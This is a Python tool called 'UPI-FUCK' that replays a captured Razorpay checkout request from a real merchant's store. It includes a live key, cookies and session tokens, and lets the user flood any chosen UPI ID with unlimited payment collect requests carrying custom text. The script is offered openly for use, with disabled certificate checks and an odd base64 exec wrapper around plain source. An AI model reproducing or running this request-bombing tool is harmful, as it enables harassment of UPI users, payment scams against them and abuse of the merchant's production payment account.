import base64;exec(compile(base64.b64decode('#!/usr/bin/env python3
"""
UPI-FUCK - Razorpay API Request Sender
Developed by rantu aka Quadra_v69
github.com/Quadra-v69 | instagram.com/reflame.x 
linkedin.com/in/rantu-dev | x.com/Quadra_v69
"""

import requests
import time
import sys
import urllib.parse
from urllib.parse import unquote
import re

def get_session_token():
    """Fetch session token from Razorpay checkout endpoint"""
    url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=f1e552504c786fd54b7d1a06e90f0af15ade879e&build_v1=6cd05ea285a7bf9e38e4f7d9ae018569f7afb8ca&checkout_v2=1&new_session=1&rzp_device_id=1.97e06c1363d84d84c1ebfac55d1652a3a91e81df.1755619989671.30879892"
    
    headers = {
        'Host': 'api.razorpay.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'iframe',
        'Sec-Fetch-Storage-Access': 'active',
        'Referer': 'https://boighar.in/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,af;q=0.8,bn;q=0.7,as;q=0.6',
        'Cookie': '_iidt=pyAKi8bTWeJf7ky7a6XHq0UkNtARX/0jUpDI6KyRl3FcKxu+SjQfxQrIMR78pG9fUT+lgiaB18DR390zygvh5vID6ll5LNfZiuhxky8=; razorpay_affordability_widget_fid=eyJpZCI6Ing4cjBwN2dza2dteHY3M1EiLCJ2ZXJzaW9uIjoiMyJ9; user_fingerprint_v2=73efc902ffb2c46de50cc351019e97246df6388fc4c9f4576fcb0fd542c24b9d; testcookie=1; prefill_data_v1=paN7Lr9rZGYUF/9I3556IzpkznsC7+fpxz20O4mg8uaC5VzdzK3yYEhr3K9KT3YbHYI5nmWpbuXyAkWDndy7KN4ESiOLwFgyWDYOzOJIqnW7NRmTgjBZIXDjnVrur/CqSGIJ'
    }
    
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200:
            # Extract session token from response using regex
            match = re.search(r'window\.session_token\s*=\s*"([^"]+)"', response.text)
            if match:
                return match.group(1)
            else:
                print("Session token not found in response")
                return None
        else:
            print(f"Failed to fetch session token. Status: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Request for session token failed: {e}")
        return None

def get_user_input():
    """Get user input for request parameters"""
    try:
        # Get UPI ID from user
        upi_id = input("\033[92mEnter UPI ID (e.g., abc@okicici): \033[0m").strip()
        if not upi_id or '@' not in upi_id:
            print("Invalid UPI ID format. Using default: test@okaxis")
            upi_id = "test@okaxis"

        # Get description from user
        try:
            description = input("\033[92mEnter payment description (e.g., hi hello): \033[0m").strip()
            if not description:
                print("\033[91mUsing default description: Order 144020\033[0m")
                description = "Order 144020"
        except Exception as e:
            print(f"\033[91mError reading description: {e}\033[0m")
            description = "Order 144020"
        
        # Get request count
        request_count = int(input("\033[92mEnter number of requests to send: \033[0m"))
        if request_count <= 0:
            print("Request count must be positive. Using default of 1.")
            request_count = 1
            
        # Get delay
        delay_input = input("\033[92mEnter delay between requests in seconds (default 0, max 5): \033[0m").strip()
        if delay_input == "":
            delay = 0
        else:
            delay = float(delay_input)
            delay = min(max(delay, 0), 5)  # Clamp between 0 and 5
            
        return upi_id, description, request_count, delay
        
    except ValueError:
        print("Invalid input. Using defaults: test@okaxis, Order 144020, 1 request, 0 delay.")
        return "test@okaxis", "Order 144020", 1, 0

def send_razorpay_request(upi_id, description, session_token):
    """Send a single Razorpay API request with custom UPI ID and session token"""
    url = f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id=rzp_live_EJSc50YaGx9FTl&session_token={session_token}"
    
    headers = {
        'Host': 'api.razorpay.com',
        'Connection': 'close',
        'Content-Length': '1029',
        'x-session-token': 'D8A79A5F36EB78B62C4F887EC8D28C33E30159CFFE8C36F3CFFB834EC6506ECDB52EC81D3C5E470098526DF90EE9EB186EAC7B54520CBC1891B0D2776DE30FD34741E5DD043A56C78D2F14DFA52F3A76042B2D53C862A05C9EC6730AD48FFFEA7159CA5CDC620CE7',
        'sec-ch-ua-platform': '"Windows"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'DNT': '1',
        'Content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?0',
        'Accept': '*/*',
        'Origin': 'https://api.razorpay.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Storage-Access': 'active',
        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=1c6583575ee58b9cc8c6207695bf395273e77bb4&build_v1=6cd05ea285a7bf9e38e4f7d9ae018569f7afb8ca&checkout_v2=1&new_session=1&rzp_device_id=1.97e06c1363d84d84c1ebfac55d1652a3a91e81df.1755619989671.30879892&session_token=D8A79A5F36EB78B62C4F887EC8D28C33E30159CFFE8C36F3CFFB834EC6506ECDB52EC81D3C5E470098526DF90EE9EB186EAC7B54520CBC1891B0D2776DE30FD34741E5DD043A56C78D2F14DFA52F3A76042B2D53C862A05C9EC6730AD48FFFEA7159CA5CDC620CE7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,af;q=0.8,bn;q=0.7,as;q=0.6'
    }
    
    # Original data with UPI ID replaced
    base_data = 'description=REPLACE_DESCRIPTION&notes%5Bwoocommerce_order_id%5D=144020&notes%5Bwoocommerce_order_number%5D=144020&key_id=rzp_live_EJSc50YaGx9FTl&contact=%2B919999999999&email=rtrkjtrhkht%40cghfh.com&currency=INR&_%5Bintegration%5D=woocommerce&_%5Bintegration_version%5D=4.7.6&_%5Bintegration_parent_version%5D=10.1.0&_%5Bcheckout_id%5D=R7FszGku3qCyM1&_%5Bdevice.id%5D=1.97e06c1363d84d84c1ebfac55d1652a3a91e81df.1755619991301.66305301&_%5Benv%5D=&_%5Blibrary%5D=checkoutjs&_%5Blibrary_src%5D=no-src&_%5Bcurrent_script_src%5D=no-src&_%5Bis_magic_script%5D=false&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fboighar.in%2Fcheckout%2Forder-pay%2F144020%2F%3Fkey%3Dwc_order_ciWERm5kPuxut&_%5Bshield%5D%5Bfhash%5D=97e06c1363d84d84c1ebfac55d1652a3a91e81df&_%5Bshield%5D%5Btz%5D=330&_%5Bdevice_id%5D=1.97e06c1363d84d84c1ebfac55d1652a3a91e81df.1755619991301.66305301&_%5Bbuild%5D=17041188511&_%5Brequest_index%5D=0&amount=36700&order_id=order_R7FswJ9R2qNmLM&method=upi&_%5Bflow%5D=directpay&vpa=REPLACE_UPI_ID&upi%5Bflow%5D=collect'
    
    # Replace the UPI ID and description in the data
    data = base_data.replace('REPLACE_UPI_ID', urllib.parse.quote(upi_id))
    data = data.replace('REPLACE_DESCRIPTION', urllib.parse.quote(description))
    data = unquote(data)
    
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=30)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def main():
    """Main function to run the script"""
    print(""" \033[92m
U::::::U     U::::::UP::::::::::::::::P  I::::::::I                 F::::::::::::::::::::F                                      k::::::k           
U::::::U     U::::::UP::::::PPPPPP:::::P I::::::::I                 F::::::::::::::::::::F                                      k::::::k           
UU:::::U     U:::::UUPP:::::P     P:::::PII::::::II                 FF::::::FFFFFFFFF::::F                                      k::::::k           
 U:::::U     U:::::U   P::::P     P:::::P  I::::I                     F:::::F       FFFFFFuuuuuu    uuuuuu      cccccccccccccccc k:::::k    kkkkkkk
 U:::::D     D:::::U   P::::P     P:::::P  I::::I                     F:::::F             u::::u    u::::u    cc:::::::::::::::c k:::::k   k:::::k 
 U:::::D     D:::::U   P::::PPPPPP:::::P   I::::I                     F::::::FFFFFFFFFF   u::::u    u::::u   c:::::::::::::::::c k:::::k  k:::::k  
 U:::::D     D:::::U   P::::PPPPPPPPP      I::::I   ---------------   F:::::::::::::::F   u::::u    u::::u  c:::::::cccccc:::::c k:::::k k:::::k   
 U:::::D     D:::::U   P::::P              I::::I   -:::::::::::::-   F:::::::::::::::F   u::::u    u::::u  c::::::c     ccccccc k::::::k:::::k    
 U:::::D     D:::::U   P::::P              I::::I                     F::::::FFFFFFFFFF   u::::u    u::::u  c:::::c              k:::::::::::k     
 U:::::D     D:::::U   P::::P              I::::I                     F:::::F             u::::u    u::::u  c:::::c              k:::::::::::k     
 U::::::U   U::::::U   P::::P              I::::I                     F:::::F             u:::::uuuu:::::u  c::::::c     ccccccc k::::::k:::::k    
 U:::::::UUU:::::::U PP::::::PP          II::::::II                 FF:::::::FF           u:::::::::::::::uuc:::::::cccccc:::::ck::::::k k:::::k   
  UU:::::::::::::UU  P::::::::P          I::::::::I                 F::::::::FF            u:::::::::::::::u c:::::::::::::::::ck::::::k  k:::::k  
    UU:::::::::UU    P::::::::P          I::::::::I                 F::::::::FF             uu::::::::uu:::u  cc:::::::::::::::ck::::::k   k:::::k 
      UUUUUUUUU      PPPPPPPPPP          IIIIIIIIII                 FFFFFFFFFFF               uuuuuuuu  uuuu    cccccccccccccccckkkkkkkk    kkkkkkk
                                                                                   
                   \033[0m""")
    print("=" * 70)
    print("            \033[92mUPI-FUCK - Razorpay API Request Sender\033[0m")
    print("=" * 70)
    print("\033[91mDeveloped by rantu aka Quadra_v69\033[0m")
    print("\033[92mgithub.com/Quadra-v69 | instagram.com/reflame.x\033[0m")
    print("\033[92mlinkedin.com/in/rantu-dev | x.com/Quadra_v69\033[0m")
    print("=" * 70)
    print("⚠️  SECURITY NOTE: This script sends requests to Razorpay's production API.")
    print("\033[91m   try at your own risk\033[0m")
    print("=" * 70)
    
    # Fetch session token
    print("Fetching session token...")
    session_token = get_session_token()
    if not session_token:
        print("Failed to obtain session token. Using default.")
        session_token = "8DDE6D945CA63CACBCF72D1FDA0C102EABCA0C37A5E8E2E3889E2D89286F9C2EB715D17AEB905DBF2BDEC96C6E7816ED087146ABEDBB1296C024B11EB9C7A72C3999DA6EB9CE47D241B0035C9CCC18FA9171BE5D3C661545ED2818D1D78A6EB441F8225515C9D92B"
    
    # Get user input
    upi_id, description, request_count, delay = get_user_input()
    
    print(f"\033[92m\nTarget UPI ID: {upi_id}\033[0m")
    print(f"\033[92mDescription: {description}\033[0m")
    print(f"\033[92mSession Token: {session_token[:20]}...\033[0m")
    print(f"\033[92mSending {request_count} requests with {delay} second delay...\033[0m")
    print("Press Ctrl+C to stop at any time")
    print("-" * 50)
    
    success_count = 0
    failure_count = 0
    
    start_time = time.time()
    
    for i in range(request_count):
        try:
            print(f"Request {i+1}/{request_count}: ", end="", flush=True)
            
            response = send_razorpay_request(upi_id, description, session_token)
            
            if response is not None:
                print(f"Status: {response.status_code}, Size: {len(response.content)} bytes")
                success_count += 1
                
                # Log response details for debugging
                if response.status_code != 200:
                    print(f"  Response: {response.text[:200]}...")
            else:
                print("Failed to send request")
                failure_count += 1
            
            # Add delay if specified (except after last request)
            if i < request_count - 1 and delay > 0:
                time.sleep(delay)
                
        except KeyboardInterrupt:
            print("\n\nStopped by user")
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            failure_count += 1
    
    # Calculate execution time
    execution_time = time.time() - start_time
    
    # Summary
    print("\n" + "=" * 50)
    print("SUMMARY:")
    print(f"Target UPI ID: {upi_id}")
    print(f"Description: {description}")
    print(f"Total requests attempted: {request_count}")
    print(f"Successful requests: {success_count}")
    print(f"Failed requests: {failure_count}")
    print(f"Execution time: {execution_time:.2f} seconds")
    print("=" * 50)
    print("UPI-FUCK - Developed by rantu aka Quadra_v69")
    print("=" * 50)

if __name__ == "__main__":
    # Suppress SSL warnings since we're using verify=False
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()
'),'<string>','exec'))